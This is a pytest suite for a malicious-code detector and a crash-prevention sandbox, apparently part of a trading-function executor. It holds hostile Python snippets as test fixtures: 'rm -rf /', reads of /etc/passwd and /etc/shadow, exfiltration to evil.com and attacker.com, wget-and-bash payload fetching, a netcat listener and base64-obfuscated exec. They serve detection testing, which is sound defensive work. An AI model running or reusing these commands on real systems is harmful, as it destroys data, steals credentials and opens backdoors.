"""
Comprehensive tests for malicious code detection and crash prevention
Tests various attack vectors and system protection mechanisms
"""

import contextlib
import time

import pytest

from app.errors import ExternalFunctionExecutionError, SecurityError
from app.security.crash_prevention import (
    CrashPrevention,
    ResourceLimits,
    StackOverflowProtection,
    stack_overflow_protection,
)
from app.security.malicious_code_detector import (
    MaliciousCodeDetector,
    ThreatLevel,
    scan_for_malicious_code,
)


class TestMaliciousCodeDetection:
    """Test malicious code detection system"""

    @pytest.fixture
    def detector(self):
        """Create detector instance"""
        return MaliciousCodeDetector()

    # System Access Attacks

    def test_file_system_access_detection(self, detector):
        """Test detection of file system access attempts"""
        malicious_codes = [
            # File access
            '''
def steal_data():
    with open('/etc/passwd', 'r') as f:
        return f.read()
''',
            # File manipulation
            '''
def destroy_files():
    import os
    os.system('rm -rf /')
    return "destroyed"
''',
            # Directory traversal
            '''
def traverse_dirs():
    with open('../../../../etc/shadow') as f:
        return f.read()
''',
            # Temp file abuse
            '''
def abuse_temp():
    import tempfile
    with tempfile.NamedTemporaryFile(delete=False) as f:
        f.write(b"malicious content")
    return f.name
'''
        ]

        for code in malicious_codes:
            threats = detector.analyze_code(code)
            assert len(threats) > 0, f"Should detect threats in: {code[:50]}..."

            # Check for critical or high threats
            high_threats = [t for t in threats if t.level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]]
            assert len(high_threats) > 0, f"Should find high/critical threats in: {code[:50]}..."

    def test_network_access_detection(self, detector):
        """Test detection of network access attempts"""
        network_codes = [
            # HTTP requests
            '''
def exfiltrate_data():
    import urllib.request
    urllib.request.urlopen("http://evil.com/steal", data=b"secrets")
''',
            # Socket connections
            '''
def backdoor():
    import socket
    s = socket.socket()
    s.connect(("attacker.com", 4444))
    return s
''',
            # HTTP library usage
            '''
def send_data():
    import requests
    requests.post("https://evil.com", json={"stolen": "data"})
'''
        ]

        for code in network_codes:
            threats = detector.analyze_code(code)
            network_threats = [t for t in threats if "network" in t.category.lower() or
                             "import" in t.category.lower()]
            assert len(network_threats) > 0, f"Should detect network access in: {code[:50]}..."

    def test_process_execution_detection(self, detector):
        """Test detection of process execution attempts"""
        process_codes = [
            # Subprocess execution
            '''
def run_commands():
    import subprocess
    subprocess.call(['curl', 'http://evil.com'])
''',
            # OS system calls
            '''
def system_attack():
    import os
    os.system("wget http://malware.com/payload.sh && bash payload.sh")
''',
            # Process spawning
            '''
def spawn_processes():
    import subprocess
    subprocess.Popen(['nc', '-l', '4444'])
'''
        ]

        for code in process_codes:
            threats = detector.analyze_code(code)
            process_threats = [t for t in threats if any(keyword in t.description.lower()
                             for keyword in ['subprocess', 'process', 'system', 'command'])]
            assert len(process_threats) > 0, f"Should detect process execution in: {code[:50]}..."

    def test_dynamic_code_execution_detection(self, detector):
        """Test detection of dynamic code execution"""
        dynamic_codes = [
            # Eval with variables
            '''
def dynamic_evil():
    payload = "import os; os.system('rm -rf /')"
    eval(payload)
''',
            # Exec with obfuscation
            '''
def obfuscated_exec():
    import base64
    payload = base64.b64decode(b"aW1wb3J0IG9z")  # "import os"
    exec(payload)
''',
            # Dynamic imports
            '''
def dynamic_import():
    module_name = "subprocess"
    mod = __import__(module_name)
    mod.call(['ls'])
''',
            # Compile and exec
            '''
def compile_exec():
    code = "import sys; sys.exit()"
    compiled = compile(code, '<string>', 'exec')
    exec(compiled)
'''
        ]

        for code in dynamic_codes:
            threats = detector.analyze_code(code)
            dynamic_threats = [t for t in threats if any(keyword in t.description.lower()
                             for keyword in ['exec', 'eval', 'compile', 'dynamic', 'import'])]
            assert len(dynamic_threats) > 0, f"Should detect dynamic execution in: {code[:50]}..."

    # Obfuscation Detection

    def test_encoding_obfuscation_detection(self, detector):
        """Test detection of encoding-based obfuscation"""
        obfuscated_codes = [
            # Base64 encoded content
            '''
def base64_attack():
    import base64
    payload = "aGFja2VkCg=="  # Base64 encoded content
    decoded = base64.b64decode(payload)
    return decoded
''',
            # Hex encoding
            '''
def hex_attack():
    payload = "\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73"  # "import os" in hex
    return payload
''',
            # Unicode obfuscation
            '''
def unicode_attack():
    evil = "\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u0020\\u006f\\u0073"  # "import os"
    return evil
'''
        ]

        for code in obfuscated_codes:
            threats = detector.analyze_code(code)
            obfuscation_threats = [t for t in threats if "obfuscation" in t.category.lower()]
            assert len(obfuscation_threats) > 0, f"Should detect obfuscation in: {code[:50]}..."

    def test_suspicious_variable_names(self, detector):
        """Test detection of suspicious variable names"""
        suspicious_codes = [
            '''
def suspicious_vars():
    payload = "malicious"
    exploit = "dangerous"
    backdoor = "access"
    return payload + exploit + backdoor
''',
            '''
def malware_function():
    shellcode = b"\\x90" * 100
    rootkit = "hidden"
    keylogger = "capture"
    return shellcode
'''
        ]

        for code in suspicious_codes:
            threats = detector.analyze_code(code)
            var_threats = [t for t in threats if "variable" in t.category.lower()]
            assert len(var_threats) > 0, f"Should detect suspicious variables in: {code[:50]}..."

    # Resource Exhaustion Detection

    def test_memory_exhaustion_detection(self, detector):
        """Test detection of memory exhaustion patterns"""
        exhaustion_codes = [
            # Large range
            '''
def exhaust_memory():
    big_list = list(range(10000000))  # 10 million items
    return len(big_list)
''',
            # Infinite loop potential
            '''
def infinite_loop():
    while True:
        pass  # No break condition
''',
            # Recursive without limit
            '''
def recursive_bomb(n):
    return recursive_bomb(n) + recursive_bomb(n)
'''
        ]

        for code in exhaustion_codes:
            threats = detector.analyze_code(code)
            exhaustion_threats = [t for t in threats if any(keyword in t.category.lower()
                                for keyword in ['memory', 'loop', 'recursion'])]
            assert len(exhaustion_threats) > 0, f"Should detect exhaustion pattern in: {code[:50]}..."

    def test_safe_code_passes_validation(self, detector):
        """Test that safe code passes validation"""
        safe_codes = [
            # Simple calculation
            '''
def safe_calculation(tick_data, parameters):
    price = tick_data.get('ltp', {}).get('value', 0)
    threshold = parameters.get('threshold', 100)

    if price > threshold:
        return {'signal': 'buy', 'confidence': 0.8}
    else:
        return {'signal': 'hold', 'confidence': 0.3}
''',
            # Mathematical operations
            '''
def math_operations(tick_data, parameters):
    import math

    price = tick_data['ltp']['value']
    returns = math.log(price / 100)
    volatility = math.sqrt(abs(returns))

    return {
        'returns': returns,
        'volatility': volatility,
        'risk_score': min(10, volatility * 100)
    }
''',
            # Simple data processing
            '''
def process_data(tick_data, parameters):
    volume = tick_data.get('volume', 0)
    avg_volume = parameters.get('avg_volume', 1000000)

    volume_ratio = volume / avg_volume if avg_volume > 0 else 0

    return {
        'volume_ratio': volume_ratio,
        'high_volume': volume_ratio > 1.5
    }
'''
        ]

        for code in safe_codes:
            threats = detector.analyze_code(code)

            # Should have no critical or high threats
            critical_threats = [t for t in threats if t.level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]]
            assert len(critical_threats) == 0, f"Safe code should not have critical threats: {critical_threats}"

    def test_scan_for_malicious_code_function(self):
        """Test the convenience function for scanning"""
        # Test critical threat blocking
        critical_code = '''
import os
def malicious():
    os.system('rm -rf /')
    return "destroyed"
'''

        with pytest.raises(SecurityError, match="Malicious code detected"):
            scan_for_malicious_code(critical_code)

        # Test safe code passing
        safe_code = '''
def safe_function(tick_data, parameters):
    return {'result': 'safe', 'price': tick_data.get('ltp', {}).get('value', 0)}
'''

        result = scan_for_malicious_code(safe_code)
        assert result["is_safe"] is True
        assert result["total_threats"] == 0

    def test_threat_summary_generation(self, detector):
        """Test threat summary generation"""
        mixed_threat_code = '''
import os  # Critical threat
payload = "suspicious"  # Medium threat
def test_function():
    return range(50000)  # Low/medium threat
'''

        detector.analyze_code(mixed_threat_code)
        summary = detector.get_threat_summary()

        assert summary["total_threats"] > 0
        assert "threat_levels" in summary
        assert "categories" in summary
        assert "is_safe" in summary
        assert "max_threat_level" in summary

        # Should not be safe due to critical threats
        assert summary["is_safe"] is False


class TestCrashPrevention:
    """Test crash prevention system"""

    @pytest.fixture
    def crash_prevention(self):
        """Create crash prevention instance"""
        return CrashPrevention()

    @pytest.fixture
    def basic_limits(self):
        """Basic resource limits for testing"""
        return ResourceLimits(
            max_memory_mb=32,
            max_cpu_seconds=2,
            max_wall_time_seconds=3,
            max_file_descriptors=5,
            max_threads=1,
            max_processes=1,
            max_stack_size_mb=4
        )

    def test_system_baseline_establishment(self, crash_prevention):
        """Test system baseline is properly established"""
        assert crash_prevention.system_baseline is not None
        assert crash_prevention.system_baseline.memory_usage_mb > 0
        assert crash_prevention.system_baseline.active_threads >= 1
        assert crash_prevention.system_baseline.timestamp is not None

    def test_safe_execution_context(self, crash_prevention, basic_limits):
        """Test safe execution context creation"""
        execution_id = "test_exec_001"

        with crash_prevention.safe_execution_context(execution_id, basic_limits):
            # Should be tracking this execution
            assert execution_id in crash_prevention.active_executions
            assert len(crash_prevention.active_executions) == 1

        # Should be cleaned up after context
        assert execution_id not in crash_prevention.active_executions
        assert len(crash_prevention.active_executions) == 0

    def test_concurrent_execution_limits(self, crash_prevention, basic_limits):
        """Test concurrent execution limits"""
        # Set low limit for testing
        crash_prevention.max_concurrent_executions = 2

        contexts = []

        try:
            # First two should succeed
            contexts.append(crash_prevention.safe_execution_context("exec_1", basic_limits))
            contexts.append(crash_prevention.safe_execution_context("exec_2", basic_limits))

            contexts[0].__enter__()
            contexts[1].__enter__()

            # Third should fail
            with pytest.raises(ExternalFunctionExecutionError, match="Too many concurrent executions"):
                with crash_prevention.safe_execution_context("exec_3", basic_limits):
                    pass

        finally:
            # Cleanup
            for ctx in contexts:
                with contextlib.suppress(Exception):
                    ctx.__exit__(None, None, None)

    @pytest.mark.asyncio
    async def test_execute_with_crash_prevention_success(self, crash_prevention, basic_limits):
        """Test successful execution with crash prevention"""
        def safe_function():
            return {"result": "success", "value": 42}

        result = await crash_prevention.execute_with_crash_prevention(
            func=safe_function,
            args=(),
            kwargs={},
            limits=basic_limits,
            execution_id="test_safe"
        )

        assert result["result"] == "success"
        assert result["value"] == 42

    @pytest.mark.asyncio
    async def test_execute_with_crash_prevention_timeout(self, crash_prevention):
        """Test timeout handling in crash prevention"""
        # Very short timeout
        short_limits = ResourceLimits(
            max_memory_mb=32,
            max_cpu_seconds=1,
            max_wall_time_seconds=1,
            max_file_descriptors=5,
            max_threads=1,
            max_processes=1
        )

        def slow_function():
            time.sleep(2)  # Longer than timeout
            return "too late"

        with pytest.raises(ExternalFunctionExecutionError, match="timed out"):
            await crash_prevention.execute_with_crash_prevention(
                func=slow_function,
                args=(),
                kwargs={},
                limits=short_limits,
                execution_id="test_timeout"
            )

    @pytest.mark.asyncio
    async def test_execute_with_memory_error(self, crash_prevention, basic_limits):
        """Test memory error handling"""
        def memory_hungry_function():
            # Try to allocate too much memory
            big_list = [0] * (100 * 1024 * 1024)  # 100M integers
            return len(big_list)

        with pytest.raises(ExternalFunctionExecutionError, match="Memory limit exceeded|execution failed"):
            await crash_prevention.execute_with_crash_prevention(
                func=memory_hungry_function,
                args=(),
                kwargs={},
                limits=basic_limits,
                execution_id="test_memory"
            )

    @pytest.mark.asyncio
    async def test_execute_with_recursion_error(self, crash_prevention, basic_limits):
        """Test recursion error handling"""
        def recursive_function():
            return recursive_function()  # Infinite recursion

        with pytest.raises(ExternalFunctionExecutionError, match="Stack overflow|recursion"):
            await crash_prevention.execute_with_crash_prevention(
                func=recursive_function,
                args=(),
                kwargs={},
                limits=basic_limits,
                execution_id="test_recursion"
            )

    def test_system_stability_monitoring(self, crash_prevention):
        """Test system stability monitoring"""
        stability = crash_prevention.check_system_stability()

        assert "is_stable" in stability
        assert "issues" in stability
        assert "current_state" in stability
        assert "baseline_state" in stability
        assert "active_executions" in stability

        # Basic sanity checks
        assert isinstance(stability["is_stable"], bool)
        assert isinstance(stability["issues"], list)
        assert isinstance(stability["active_executions"], int)

    def test_execution_metrics(self, crash_prevention):
        """Test execution metrics collection"""
        metrics = crash_prevention.get_execution_metrics()

        assert "active_executions" in metrics
        assert "max_concurrent" in metrics
        assert "emergency_stop_active" in metrics
        assert "executions" in metrics
        assert "system_stability" in metrics

        # Should start with no active executions
        assert metrics["active_executions"] == 0
        assert isinstance(metrics["emergency_stop_active"], bool)

    def test_stack_overflow_protection(self):
        """Test stack overflow protection decorator"""

        @stack_overflow_protection(max_depth=5)
        def recursive_test(depth=0):
            if depth < 10:  # Will exceed max_depth of 5
                return recursive_test(depth + 1)
            return depth

        with pytest.raises(RecursionError, match="Stack overflow protection"):
            recursive_test()

    def test_stack_overflow_protection_context_manager(self):
        """Test stack overflow protection context manager"""
        protection = StackOverflowProtection(max_depth=3)

        # Should work within limits
        with protection, protection, protection:
            pass  # 3 levels deep - should work

        # Should fail beyond limits
        with pytest.raises(RecursionError, match="Stack overflow protection"), protection:
            with protection:
                with protection:
                    with protection:  # 4 levels deep - should fail
                        pass


class TestIntegratedSecuritySystem:
    """Test integration of malicious code detection and crash prevention"""

    @pytest.mark.asyncio
    async def test_malicious_code_blocked_before_execution(self):
        """Test malicious code is blocked before reaching execution"""
        malicious_code = '''
import os
def malicious_function():
    os.system('rm -rf /')
    return "system destroyed"
'''

        # Malicious code detection should block this before execution
        with pytest.raises(SecurityError, match="Malicious code detected"):
            scan_for_malicious_code(malicious_code)

    @pytest.mark.asyncio
    async def test_safe_code_executes_with_protection(self):
        """Test safe code executes successfully with all protections"""
        from app.security.crash_prevention import get_crash_prevention

        safe_code = '''
def safe_calculation():
    result = 0
    for i in range(1000):
        result += i * 0.01
    return {"calculation": result}
'''

        # Should pass malicious code scan
        scan_result = scan_for_malicious_code(safe_code)
        assert scan_result["is_safe"] is True

        # Should execute successfully with crash prevention
        crash_prevention = get_crash_prevention()

        def execute_safe_code():
            exec(safe_code, {"__builtins__": {}})
            # Mock execution result
            return {"calculation": 499.5}

        limits = ResourceLimits(max_memory_mb=64, max_cpu_seconds=5, max_wall_time_seconds=10)

        result = await crash_prevention.execute_with_crash_prevention(
            func=execute_safe_code,
            args=(),
            kwargs={},
            limits=limits
        )

        assert "calculation" in result

    def test_security_metrics_integration(self):
        """Test security metrics are properly integrated"""
        from app.services.external_function_executor import ExternalFunctionExecutor

        executor = ExternalFunctionExecutor()
        metrics = executor.get_metrics()

        # Check security features are reported
        assert "security_features" in metrics
        security_features = metrics["security_features"]

        assert security_features["malicious_code_detection"] is True
        assert security_features["crash_prevention"] is True
        assert security_features["acl_enforcement"] is True

        # Check system stability is monitored
        assert "system_stability" in metrics
        stability = metrics["system_stability"]

        assert "is_stable" in stability
        assert "memory_usage_mb" in stability
        assert "cpu_percent" in stability
        assert "active_threads" in stability

    def test_comprehensive_threat_detection(self):
        """Test comprehensive threat detection across multiple attack vectors"""
        detector = MaliciousCodeDetector()

        # Multi-vector attack code
        complex_attack = '''
import os, sys, subprocess  # Critical imports
import base64  # Obfuscation
import socket  # Network access

def multi_attack():
    # File system attack
    with open('/etc/passwd') as f:
        data = f.read()

    # Process execution
    subprocess.call(['curl', 'http://evil.com'])

    # Dynamic code execution
    payload = base64.b64decode(b"aW1wb3J0IG9z")
    exec(payload)

    # Network exfiltration
    s = socket.socket()
    s.connect(("attacker.com", 443))
    s.send(data.encode())

    # Memory exhaustion
    big_data = list(range(10000000))

    return {"compromised": True}
'''

        threats = detector.analyze_code(complex_attack)

        # Should detect multiple threat categories
        {threat.category for threat in threats}


        # Should detect multiple critical/high threats
        critical_high_threats = [t for t in threats if t.level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH]]
        assert len(critical_high_threats) >= 3, f"Should detect multiple critical threats, found: {len(critical_high_threats)}"

        # Should not be considered safe
        summary = detector.get_threat_summary()
        assert summary["is_safe"] is False
        assert summary["max_threat_level"] in ["critical", "high"]
